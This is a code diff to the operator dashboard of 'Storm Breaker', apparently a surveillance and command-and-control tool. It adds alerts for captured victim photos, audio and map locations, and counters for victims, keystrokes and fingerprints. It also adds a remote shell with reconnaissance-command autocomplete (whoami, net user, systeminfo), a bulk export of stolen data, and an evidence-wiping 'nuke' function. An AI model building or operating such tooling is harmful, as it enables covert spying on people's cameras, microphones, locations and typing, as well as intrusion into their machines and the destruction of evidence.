@@ -1,5 +1,63 @@
 var old_data = '';
 var log_history = [];
+var soundEnabled = true;
+var notificationCount = 0;
+var lastEventCount = 0;
+
+// ===== SOUND NOTIFICATION =====
+function playNotificationSound() {
+    if (!soundEnabled) return;
+    try {
+        var ctx = new (window.AudioContext || window.webkitAudioContext)();
+        var osc = ctx.createOscillator();
+        var gain = ctx.createGain();
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.frequency.value = 800;
+        osc.type = 'sine';
+        gain.gain.value = 0.1;
+        osc.start(ctx.currentTime);
+        osc.stop(ctx.currentTime + 0.15);
+        setTimeout(function() {
+            var osc2 = ctx.createOscillator();
+            var gain2 = ctx.createGain();
+            osc2.connect(gain2);
+            gain2.connect(ctx.destination);
+            osc2.frequency.value = 1200;
+            osc2.type = 'sine';
+            gain2.gain.value = 0.1;
+            osc2.start(ctx.currentTime);
+            osc2.stop(ctx.currentTime + 0.1);
+        }, 150);
+    } catch(e) {}
+}
+
+// ===== KEYBOARD SHORTCUTS =====
+document.addEventListener('keydown', function(e) {
+    // Ctrl+1-9 to switch tabs
+    if (e.ctrlKey && e.key >= '1' && e.key <= '9') {
+        e.preventDefault();
+        var tabs = document.querySelectorAll('.tab-btn');
+        var idx = parseInt(e.key) - 1;
+        if (tabs[idx]) tabs[idx].click();
+    }
+    // Ctrl+E to export logs
+    if (e.ctrlKey && e.key === 'e') {
+        e.preventDefault();
+        saveTextAsFile(getFullLogs(), 'log.txt');
+    }
+    // Ctrl+K to clear logs
+    if (e.ctrlKey && e.key === 'k') {
+        e.preventDefault();
+        var btn = document.getElementById('btn-clear');
+        if (btn) btn.click();
+    }
+    // Escape to focus terminal input
+    if (e.key === 'Escape') {
+        var sysInput = document.getElementById('sys-cmd-input');
+        if (sysInput) sysInput.focus();
+    }
+});
 
 // Load saved logs from localStorage on startup
 function loadSavedLogs() {
@@ -59,22 +117,43 @@ function Listener() {
             var timestamp = new Date().toLocaleTimeString();
             var logTypeClass = 'text-blue-400';
             var displayData = data;
+            var iconClass = 'fa-info-circle';
 
             if (data.includes("Image")) {
                 show_notif("Image File Saved", 'Path : ' + data.slice(26), true);
                 logTypeClass = 'text-purple-400 font-bold';
+                iconClass = 'fa-camera';
+                notificationCount++;
             } else if (data.includes("Audio")) {
                 show_notif("Audio File Saved", 'Path : ' + data.slice(26), false);
                 logTypeClass = 'text-pink-400 font-bold';
+                iconClass = 'fa-microphone';
+                notificationCount++;
             } else if (data.includes("Google Map")) {
                 show_notif("Google Map Link", data.slice(18), true);
                 logTypeClass = 'text-emerald-400 font-bold';
+                iconClass = 'fa-map-marker-alt';
+                notificationCount++;
             }
 
+            // Play sound on new capture
+            playNotificationSound();
+
+            // Browser desktop notification
+            try {
+                if (Notification.permission === 'granted') {
+                    new Notification('Storm Breaker - New Capture', {
+                        body: data.substring(0, 100),
+                        icon: '/assets/images/logo.png'
+                    });
+                }
+            } catch(e) {}
+
             var logEntry = `
-                <div class="flex space-x-2 mb-1 font-mono text-sm animate__animated animate__fadeInLeft animate__faster border-l-2 border-slate-800 pl-2 hover:border-slate-600 transition-colors">
-                    <span class="text-slate-500 select-none">[${timestamp}]</span>
-                    <span class="${logTypeClass}">${displayData}</span>
+                <div class="flex space-x-2 mb-1 font-mono text-sm animate__animated animate__fadeInLeft animate__faster border-l-2 border-slate-800 pl-2 hover:border-blue-500 transition-colors group">
+                    <span class="text-slate-600 select-none text-xs">[${timestamp}]</span>
+                    <i class="fas ${iconClass} ${logTypeClass} text-xs mt-0.5"></i>
+                    <span class="${logTypeClass} group-hover:text-white transition-colors">${displayData}</span>
                 </div>
             `;
 
@@ -404,10 +483,43 @@ function initTerminal() {
     var input = document.getElementById('sys-cmd-input');
     var output = document.getElementById('sys-terminal-output');
     var prompt = document.getElementById('sys-prompt');
+    var cmdHistory = [];
+    var historyIndex = -1;
 
     if (!input || !output) return;
 
     input.addEventListener('keydown', function (e) {
+        // Up arrow for command history
+        if (e.key === 'ArrowUp') {
+            e.preventDefault();
+            if (cmdHistory.length > 0 && historyIndex < cmdHistory.length - 1) {
+                historyIndex++;
+                this.value = cmdHistory[cmdHistory.length - 1 - historyIndex];
+            }
+            return;
+        }
+        // Down arrow for command history
+        if (e.key === 'ArrowDown') {
+            e.preventDefault();
+            if (historyIndex > 0) {
+                historyIndex--;
+                this.value = cmdHistory[cmdHistory.length - 1 - historyIndex];
+            } else {
+                historyIndex = -1;
+                this.value = '';
+            }
+            return;
+        }
+        // Tab for auto-complete hints
+        if (e.key === 'Tab') {
+            e.preventDefault();
+            var suggestions = ['dir', 'ipconfig', 'whoami', 'systeminfo', 'netstat -an', 'tasklist', 'cd ..', 'type', 'ping', 'nslookup', 'net user', 'arp -a', 'route print'];
+            var current = this.value.toLowerCase();
+            var match = suggestions.find(s => s.startsWith(current) && s !== current);
+            if (match) this.value = match;
+            return;
+        }
+
         if (e.key === 'Enter') {
             var cmd = this.value;
             var cmdLine = document.createElement('div');
@@ -423,6 +535,10 @@ function initTerminal() {
                 this.focus();
                 return;
             }
+
+            // Save to command history
+            cmdHistory.push(cmd);
+            historyIndex = -1;
 
             fetch('/api/terminal', {
                 method: 'POST',
@@ -467,7 +583,14 @@ function initTerminal() {
 }
 
 window.addEventListener('load', function () {
-    console.log("Dashboard loading...");
+    console.log("Storm Breaker Command Center loading...");
+
+    // Request desktop notification permission
+    try {
+        if (Notification && Notification.permission === 'default') {
+            Notification.requestPermission();
+        }
+    } catch(e) {}
 
     // Initialize tabs
     var tabButtons = document.querySelectorAll('.tab-btn');
@@ -507,6 +630,8 @@ window.addEventListener('load', function () {
             activeContent.classList.add('active');
         }
     }
+    // Expose globally for sidebar navigation
+    window.setActiveTab = setActiveTab;
 
     tabButtons.forEach(function (btn) {
         btn.addEventListener('click', function (e) {
@@ -514,11 +639,15 @@ window.addEventListener('load', function () {
             var tabName = this.getAttribute('data-tab');
             setActiveTab(tabName);
 
-            // Load content
+            // Load content based on tab
             if (tabName === 'images') {
                 loadImages();
             } else if (tabName === 'audio') {
                 loadAudio();
+            } else if (tabName === 'analytics') {
+                refreshAnalytics();
+            } else if (tabName === 'intel') {
+                loadIntelData();
             }
         });
     });
@@ -529,6 +658,54 @@ window.addEventListener('load', function () {
 
         var timer = setInterval(Listener, 2000);
         var isListening = true;
+
+        // ===== LIVE STATS POLLING =====
+        function updateDashboardStats() {
+            $.get('/api/analytics/dashboard', function(data) {
+                if (data.captures) {
+                    animateCounter('stat-images', data.captures.images);
+                    animateCounter('stat-audio', data.captures.audio);
+                    animateCounter('stat-fingerprints', data.captures.fingerprints);
+                    animateCounter('stat-keystrokes', data.captures.keystrokes);
+                    
+                    // Update sidebar
+                    $('#sidebar-captures').text(data.captures.total);
+                    
+                    // Update tab badges
+                    updateBadge('badge-images', data.captures.images);
+                    updateBadge('badge-audio', data.captures.audio);
+                }
+                if (data.victims) {
+                    animateCounter('stat-victims', data.victims.total_active);
+                    $('#stat-victims-detail').text(data.victims.c2_active + ' C2 / ' + data.victims.mobile_active + ' Mobile');
+                    $('#sidebar-victims').text(data.victims.total_active);
+                    
+                    updateBadge('badge-c2', data.victims.c2_active);
+                    updateBadge('badge-mobile', data.victims.mobile_active);
+                }
+                if (data.system) {
+                    $('#stat-cpu').text(Math.round(data.system.cpu_percent) + '%');
+                    $('#stat-memory').text('RAM: ' + Math.round(data.system.memory_percent) + '%');
+                    
+                    // Update uptime
+                    var uptime = data.system.uptime;
+                    var h = Math.floor(uptime / 3600);
+                    var m = Math.floor((uptime % 3600) / 60);
+                    var s = uptime % 60;
+                    $('#sidebar-uptime').text(String(h).padStart(2,'0') + ':' + String(m).padStart(2,'0') + ':' + String(Math.floor(s)).padStart(2,'0'));
+                }
+                if (data.recent_events && data.recent_events.length > lastEventCount) {
+                    updateLiveEventFeed(data.recent_events);
+                    lastEventCount = data.recent_events.length;
+                }
+            }).fail(function() {
+                // Silently fail
+            });
+        }
+        
+        // Update stats every 5 seconds
+        updateDashboardStats();
+        setInterval(updateDashboardStats, 5000);
 
         var btnRefreshImages = document.getElementById('btn-refresh-images');
         if (btnRefreshImages) {
@@ -609,6 +786,116 @@ window.addEventListener('load', function () {
         loadSavedLogs();
 
         initTerminal();
-        console.log("Dashboard initialized successfully!");
+        console.log("Storm Breaker Command Center initialized!");
     }, 100);
 });
+
+// ===== UTILITY FUNCTIONS =====
+
+function animateCounter(id, value) {
+    var el = document.getElementById(id);
+    if (!el) return;
+    var current = parseInt(el.textContent) || 0;
+    if (current === value) return;
+    el.textContent = value;
+    el.classList.remove('count-animate');
+    void el.offsetWidth; // Trigger reflow
+    el.classList.add('count-animate');
+}
+
+function updateBadge(id, count) {
+    var badge = document.getElementById(id);
+    if (!badge) return;
+    if (count > 0) {
+        badge.textContent = count;
+        badge.classList.remove('hidden');
+    } else {
+        badge.classList.add('hidden');
+    }
+}
+
+function updateLiveEventFeed(events) {
+    var feed = document.getElementById('live-event-feed');
+    if (!feed) return;
+    
+    var html = '';
+    var recent = events.slice(-8).reverse();
+    recent.forEach(function(ev) {
+        var iconMap = {
+            'location_capture': 'fa-map-marker-alt text-emerald-400',
+            'image_capture': 'fa-camera text-purple-400',
+            'audio_capture': 'fa-microphone text-pink-400',
+            'fingerprint': 'fa-fingerprint text-blue-400',
+            'keystroke': 'fa-keyboard text-red-400',
+            'c2_register': 'fa-desktop text-yellow-400',
+            'mobile_register': 'fa-mobile-alt text-cyan-400',
+        };
+        var icon = iconMap[ev.type] || 'fa-bolt text-slate-400';
+        var time = new Date(ev.timestamp).toLocaleTimeString();
+        html += `<div class="flex items-center space-x-2 text-xs py-1 px-2 rounded hover:bg-slate-800/50 transition-colors">
+            <i class="fas ${icon} w-4 text-center"></i>
+            <span class="text-slate-500">${time}</span>
+            <span class="text-slate-300">${ev.type.replace(/_/g, ' ')}</span>
+            <span class="text-slate-600 truncate">${ev.ip || ''}</span>
+        </div>`;
+    });
+    feed.innerHTML = html || '<div class="text-xs text-slate-600 py-2">No events yet</div>';
+}
+
+// ===== EXPORT & EMERGENCY =====
+
+function exportAllData() {
+    if (window.Swal) {
+        Swal.fire({
+            title: 'Export All Data',
+            text: 'Download all captured data as a ZIP archive?',
+            icon: 'question',
+            showCancelButton: true,
+            confirmButtonText: 'Export',
+            background: '#1e293b',
+            color: '#fff',
+        }).then((result) => {
+            if (result.isConfirmed) {
+                window.location.href = '/api/export/all';
+            }
+        });
+    } else {
+        if (confirm('Export all data as ZIP?')) {
+            // Use POST via form to trigger download
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = '/api/export/all';
+            document.body.appendChild(form);
+            form.submit();
+            document.body.removeChild(form);
+        }
+    }
+}
+
+function nukeData() {
+    if (window.Swal) {
+        Swal.fire({
+            title: '⚠️ EMERGENCY DATA WIPE',
+            html: '<p class="text-red-400">This will permanently delete ALL captured data!</p><p class="text-sm text-slate-400 mt-2">Images, Audio, Fingerprints, Keystrokes, Sessions - EVERYTHING.</p>',
+            icon: 'warning',
+            showCancelButton: true,
+            confirmButtonColor: '#ef4444',
+            confirmButtonText: 'WIPE EVERYTHING',
+            cancelButtonText: 'Cancel',
+            background: '#1e293b',
+            color: '#fff',
+        }).then((result) => {
+            if (result.isConfirmed) {
+                $.post('/api/nuke', function(data) {
+                    Swal.fire({
+                        title: 'Data Wiped',
+                        text: data.files_deleted + ' files deleted.',
+                        icon: 'success',
+                        background: '#1e293b',
+                        color: '#fff'
+                    });
+                });
+            }
+        });
+    }
+}
